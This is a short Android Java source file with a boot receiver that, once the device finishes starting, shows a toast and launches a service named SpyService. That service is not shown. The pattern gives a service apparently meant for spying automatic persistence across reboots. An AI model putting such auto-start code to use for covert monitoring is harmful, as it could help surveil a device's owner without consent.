package com.example.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

import java.util.Objects;

public final class OnBootBroadcastReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		if (Objects.equals(action, Intent.ACTION_BOOT_COMPLETED)) {
			Toast.makeText(context, "Your boot, Sir", Toast.LENGTH_LONG).show();
			SpyService.startService(context);
		}
	}
}
